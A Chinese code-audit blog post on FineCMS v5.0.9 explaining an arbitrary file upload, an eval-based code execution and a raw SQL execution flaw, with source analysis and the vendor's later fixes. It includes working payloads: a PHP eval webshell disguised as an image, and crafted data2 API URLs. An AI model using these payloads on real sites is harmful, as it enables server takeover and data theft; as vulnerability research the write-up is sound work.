---
title: FineCMS v5.0.9 代码审计
date: 2017-09-11 10:53:33
tags:
	- 代码审计
	- SQL注入
	- 命令执行
---

FineCMS v5.0.9 任意文件上传&代码执行&SQL语句执行漏洞
<!-- more -->
## 0x01 任意文件上传漏洞演示&剖析

概述： 在FineCMS v5.0.9版本中，会员中心中的上传头像模块存在任意文件上传漏洞

### 漏洞演示
首先注册一个用户，进入到会员中心，上传一个名为"mengchen.jpeg"的图片马，文件内容为

```php
<?php phpinfo(); @eval($_POST['mengchen']);?>
```

上传时使用burpsuite抓包

![](https://image.mengsec.com/fincms-5.0.9-2.png)

将tx参数中的jpeg改为php,直接提交

![](https://image.mengsec.com/fincms-5.0.9-3.png)

这样文件就传上去了，而且还能执行

![](https://image.mengsec.com/fincms-5.0.9-4.png)

### 漏洞原理剖析

头像上传的函数在/finecms/dayrui/member/controllers/Account.php中的第177-214行

```php
public function upload() {

    // 创建图片存储文件夹
    $dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
    @dr_dir_delete($dir);
    !is_dir($dir) && dr_mkdirs($dir);

    if ($_POST['tx']) {
        $file = str_replace(' ', '+', $_POST['tx']);//将空格替换为+号
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
            $new_file = $dir.'0x0.'.$result[2];
            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                exit(dr_json(0, '目录权限不足或磁盘已满'));
            } else {
                $this->load->library('image_lib');
                $config['create_thumb'] = TRUE;
                $config['thumb_marker'] = '';
                $config['maintain_ratio'] = FALSE;
                $config['source_image'] = $new_file;
                foreach (array(30, 45, 90, 180) as $a) {
                    $config['width'] = $config['height'] = $a;
                    $config['new_image'] = $dir.$a.'x'.$a.'.'.$result[2];
                    $this->image_lib->initialize($config);
                    if (!$this->image_lib->resize()) {
                        exit(dr_json(0, '上传错误：'.$this->image_lib->display_errors()));
                        break;
                    }
                }
                list($width, $height, $type, $attr) = getimagesize($dir.'45x45.'.$result[2]);
                !$type && exit(dr_json(0, '图片字符串不规范'));
            }
        } else {

            exit(dr_json(0, '图片字符串不规范'));
        }
    } else {
        exit(dr_json(0, '图片不存在'));
    }
```
问题主要出现在第186行的那一句正则上

```php
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result))
```

在这里主要匹配的类似于"data:image/php;base64,"这种字符串，以"data:"开头，中间有"image/",结尾有";base64,"，但是"image/"和";base64,"之间的字符串只要是任意数字和字母即可。

![](https://image.mengsec.com/fincms-5.0.9-1.png)

最严重的是，开发者在这里将(\w+)匹配到的字符串作为了传入文件的扩展名

```php
第187行 $new_file = $dir.'0x0.'.$result[2];
```

然后文件就直接保存到服务器中了，在这之间没有任何的过滤，可以看一下测试代码

![](https://image.mengsec.com/fincms-5.0.9-5.png)

![](https://image.mengsec.com/fincms-5.0.9-6.png)

至于路径中的uid，cookie中就有

```php
$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
```

## 0x02 代码执行漏洞演示&剖析

### 漏洞演示
先放上payload

```php
index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=cache name=MEMBER.1'];phpinfo();$a=['1
```

执行效果

![](https://image.mengsec.com/fincms-5.0.9-7.png)

### 漏洞原理剖析

这个漏洞在/finecms/dayrui/controllers/Api.php中的data2()函数中

```php
public function data2() {

    $data = array();

    // 安全码认证
    $auth = $this->input->get('auth', true);
    if ($auth != md5(SYS_KEY)) {
        // 授权认证码不正确
        $data = array('msg' => '授权认证码不正确', 'code' => 0);
    } else {
        // 解析数据
        $cache = '';
        $param = $this->input->get('param');
        if (isset($param['cache']) && $param['cache']) {
            $cache = md5(dr_array2string($param));
            $data = $this->get_cache_data($cache);
        }
        if (!$data) {

            // list数据查询
            $data = $this->template->list_tag($param);
            $data['code'] = $data['error'] ? 0 : 1;
            unset($data['sql'], $data['pages']);

            // 缓存数据
            $cache && $this->set_cache_data($cache, $data, $param['cache']);
        }
    }

	// 接收参数
	$format = $this->input->get('format');
	$function = $this->input->get('function');
    if ($function) {
        if (!function_exists($function)) {
            $data = array('msg' => fc_lang('自定义函数'.$function.'不存在'), 'code' => 0);
        } else {
            $data = $function($data);
        }
    }

	// 页面输出
	if ($format == 'php') {
		print_r($data);
	} elseif ($format == 'jsonp') {
		// 自定义返回名称
		echo $this->input->get('callback', TRUE).'('.$this->callback_json($data).')';
	} else {
		// 自定义返回名称
		echo $this->callback_json($data);
	}
	exit;
}
```
进入函数后，首先是安全码认证，这个在网站内部，但是很容易获得，就是cookie的名字的开头到第一个"_"处

![](https://image.mengsec.com/fincms-5.0.9-8.png)

安全密钥在/config/system.php中第11行被定义

```php
'SYS_KEY' => '24b16fede9a67c9251d3e7c7161c83ac', //安全密钥
```
然后在/finecms/dayrui/config/config.php中第37行将其设置成为cookie的名字

```php
$config['sess_cookie_name'] = $site['SYS_KEY'].'_ci_session';
```
因此，直接在payload中使auth的值为SYS_KEY的MD5值即可。

传入的param值不满足128行的条件
​	
```php
if (isset($param['cache']) && $param['cache'])
```
因此$data依旧为空，$param直接传入list_tag()函数中

```php
$data = $this->template->list_tag($param);
```

定位一下list_tag()，在/finecms/dayrui/libraries/Template.php第402行

传入的数据被处理成$params，一个数组

```php
Array( 
[0] => action=cache 
[1] => name=member.1'];phpinfo();$a=['1
) 
```
然后经过遍历处理，将两个值分别给了$system['action']和$param['name']

```php
$system['action'] = cache
$param['name'] = member.1'];phpinfo();$a=['1
```

然后在switch-case中，进入了

```php
case 'cache': // 系统缓存数据
	if (!isset($param['name'])) {
	    return $this->_return($system['return'], 'name参数不存在');
	}
	$pos = strpos($param['name'], '.');
	if ($pos !== FALSE) {
    	$_name = substr($param['name'], 0, $pos);
    	$_param = substr($param['name'], $pos + 1);
	} else {
    	$_name = $param['name'];
    	$_param = NULL;
	}
	$cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']);
	if (!$cache) {
    	return $this->_return($system['return'], "缓存({$_name})不存在，请在后台更新缓存");
	}
	if ($_param) {
    	$data = array();
    	@eval('$data=$cache' . $this->_get_var($_param) . ';');
    	if (!$data) {
        	return $this->_return($system['return'], "缓存({$_name})参数不存在!!");
    	}
	} else {
    	$data = $cache;
	}
	return $this->_return($system['return'], $data, '');
	break;
```
代码执行的地方呢在第510行

```php
 @eval('$data=$cache'.$this->_get_var($_param).';');
```
要想将代码执行到这儿，必须使得503-506行

```php
$cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']);

if (!$cache) {
return $this->_return($system['return'], "缓存({$_name})不存在，请在后台更新缓存");
}
```
的$cache有值，在这

```php
$_name = member
$_param = 1'];phpinfo();$a=['1
```

定位一下"\_cache_var()",在/finecms/dayrui/libraries/Template.php第1594-1619行

```php
public function _cache_var($name, $site = SITE_ID) {
	$data = NULL;
	$name = strtoupper($name);
	switch ($name) {
	    case 'MEMBER':
	        $data = $this->ci->get_cache('member');
	    break;
	    case 'URLRULE':
	        $data = $this->ci->get_cache('urlrule');
	    break;
	    case 'MODULE':
	        $data = $this->ci->get_cache('module');
	    break;
	    case 'CATEGORY':
	        $site = $site ? $site : SITE_ID;
	        $data = $this->ci->get_cache('category-' . $site);
    	break;
    	default:
        	$data = $this->ci->get_cache($name . '-' . $site);
    	break;
	}
	return $data;
}
```
接着定位get_cache(),在/finecms/dayrui/core/M_Controller.php第362-402行。

在其中，把传入的$name来读取本地文件缓存数据。因此只有传入"\_cache_var()"的$name为

	MEMBER、URLRULE、MODULE、CATEGORY

中的任意一个才行，否则会引起报错。

执行到这儿,在Template.php中的$_param存在，代码执行到了

```php
@eval('$data=$cache'.$this->_get_var($_param).';');
```
中，定位一下"\_get_var()函数"

在/finecms/dayrui/libraries/Template.php第1570行
​	
```php
public function _get_var($param) {
	$array = explode('.', $param);
	if (!$array) {
	    return '';
	}
	$string = '';
	foreach ($array as $var) {
	    $string.= '[';
	    if (strpos($var, '$') === 0) {
	        $string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
	    } elseif (preg_match('/[A-Z_]+/', $var)) {
	        $string.= '' . $var . '';
	    } else {
	        $string.= '\'' . $var . '\'';
	    }
	    $string.= ']';
	}
	return $string;
}
```
在这个函数中，如果传入的参数$param的开头是一个$,

```php
$string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
```
这一条语句将会把所有的"[(任意字符)]"替换成"['1']",如果不是$开头但是字符串中有大写字母A-Z或者_,则会给字符串两边加上空格，要是条件都不满足呢，给两边都加一个单引号',最后两边分别加上[],payload最终返回的$string为

```php
['1'];phpinfo();$asd=['1']
```

然后eval语句就成了

```php
@eval(﻿$data=$cache['1'];phpinfo();$asd=['1'];)
```

代码成功执行

## 0x03 SQL语句执行漏洞演示&剖析

### 漏洞演示

payload:

```php
index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=action=sql%20sql='select%20user();'
```

执行效果

![](https://image.mengsec.com/fincms-5.0.9-9.png)

### 漏洞原理剖析

与代码执行漏洞相似，传入的参数进入data2()函数，接着传入了/finecms/dayrui/libraries/Template.php中的list_tag()函数中，经过提取action后传入switch-case语句中的sql部分(732-795行)


```php
case 'sql': // 直接sql查询
	if (preg_match('/sql=\'(.+)\'/sU', $_params, $sql)) {
	    // 数据源的选择
	    $db = $this->ci->db;
	    // 替换前缀
	    $sql = str_replace(array('@#S', '@#'), array($db->dbprefix . $system['site'], $db->dbprefix), trim(urldecode($sql[1])));
	    if (stripos($sql, 'SELECT') !== 0) {
	        return $this->_return($system['return'], 'SQL语句只能是SELECT查询语句');
	    }
	    $total = 0;
	    $pages = '';
	    // 如存在分页条件才进行分页查询
	    if ($system['page'] && $system['urlrule']) {
	        $page = max(1, (int)$_GET['page']);
	        $row = $this->_query(preg_replace('/select \* from/iUs', 'SELECT count(*) as c FROM', $sql), $system['site'], $system['cache'], FALSE);
	        $total = (int)$row['c'];
	        $pagesize = $system['pagesize'] ? $system['pagesize'] : 10;
	        // 没有数据时返回空
	        if (!$total) {
	            return $this->_return($system['return'], '没有查询到内容', $sql, 0);
	        }
	        $sql.= ' LIMIT ' . $pagesize * ($page - 1) . ',' . $pagesize;
	        $pages = $this->_get_pagination(str_replace('[page]', '{page}', urldecode($system['urlrule'])), $pagesize, $total);
	    }
	    $data = $this->_query($sql, $system['site'], $system['cache']);
	    $fields = NULL;
	    if ($system['module']) {
	        $fields = $this->ci->module[$system['module']]['field']; // 模型主表的字段
	        
	    }
	    if ($fields) {
	        // 缓存查询结果
	        $name = 'list-action-sql-' . md5($sql);
	        $cache = $this->ci->get_cache_data($name);
	        if (!$cache && is_array($data)) {
	            // 模型表的系统字段
	            $fields['inputtime'] = array('fieldtype' => 'Date');
	            $fields['updatetime'] = array('fieldtype' => 'Date');
            	// 格式化显示自定义字段内容
                foreach ($data as $i => $t) {
	                $data[$i] = $this->ci->field_format_value($fields, $t, 1);
	            }
	            //$cache = $this->ci->set_cache_data($name, $data, $system['cache']);
	            $cache = $system['cache'] ? $this->ci->set_cache_data($name, $data, $system['cache']) : $data;
	        }
	        $data = $cache;
	    }
	    return $this->_return($system['return'], $data, $sql, $total, $pages, $pagesize);
	} else {
	    return $this->_return($system['return'], '参数不正确，SQL语句必须用单引号包起来'); // 没有查询到内容
    
	}
	break;
```

使用一个简单的正则将sql语句从传入的变量$_params中提取出来，$sql的内容变成了单引号之内的，也就是

	select user();
此时$system为

	﻿Array (
	[oot] => 
	[num] => 
	[form] => 
	[page] => 
	[site] => 1 
	[flag] => 
	[more] => 
	[catid] => 
	[field] => 
	[order] => 
	[space] => 
	[table] => 
	[join] => 
	[on] => 
	[cache] => 1110 
	[action] => sql 
	[return] => 
	[sbpage] => 
	[module] => 
	[modelid] => 
	[keyword] => 
	[urlrule] => 
	[pagesize] => 
	) 
然后sql语句只是简单的判断了下是否为select开头(746-748行)
​    
```php
	if (stripos($sql, 'SELECT') !== 0) {
return $this->_return($system['return'], 'SQL语句只能是SELECT查询语句');
}
```
然后就进入了767行，数据查询函数中

```php
$data = $this->_query($sql, $system['site'], $system['cache']);
```

定位一下"_query()"函数，在Template.php文件的1319-1346行，

```php
public function _query($sql, $site, $cache, $all = TRUE) {

    // 数据库对象
    $db = $site ? $this->ci->site[$site] : $this->ci->db;
    $cname = md5($sql.dr_now_url());
    // 缓存存在时读取缓存文件
    if ($cache && $data = $this->ci->get_cache_data($cname)) {
        return $data;
    }

    // 执行SQL
    $db->db_debug = FALSE;
    $query = $db->query($sql);

    if (!$query) {
        return 'SQL查询解析不正确：'.$sql;
    }

    // 查询结果
    $data = $all ? $query->result_array() : $query->row_array();

    // 开启缓存时，重新存储缓存数据
    $cache && $this->ci->set_cache_data($cname, $data, $cache);

    $db->db_debug = TRUE;
    
    return $data;
}
```

可以看到$sql直接进入了系统函数进行了数据查询。


## 0x04 漏洞修补方案

### 1. 文件上传漏洞的修补方案

漏洞产生的主要原因是因为开发者将获取的新文件的扩展名没有添加任何验证就将其拼接到了文件名称上，可以添加一个白名单验证。只允许允许上传的文件类型的扩展名上传。

### 2. 代码执行和sql语句执行漏洞的修补方案

看这两个漏洞呢，都出现在Api.php的data2()函数中，其中的安全措施——安全码认证很容易就能获得，如果不能获得的话，那么这个漏洞后续的操作就不会被触发，我觉得可以修改cookie等需要调用安全码认证的地方，只让其获取一部分。或者让安全码不会被用户看到，验证阶段对于用户来说是一个黑箱子。

### 3. 对比5.0.11版本，查看官方解决方案

5.0.11版本中

```php
if (!in_array(strtolower($result[2]), array('jpg', 'jpeg', 'png', 'gif'))) {
        exit(dr_json(0, '目录权限不足'));
    }
```
加入了白名单



在5.0.11版本的finecms\dayrui\config\config.php文件中

```php
$config['sess_cookie_name']	= md5(substr($site['SYS_KEY'],0, 5)).'_ci_session';
```
相比较5.0.9版本直接获取SYS_KEY的值更安全了

```php
$config['sess_cookie_name']	= $site['SYS_KEY'].'_ci_session';
```
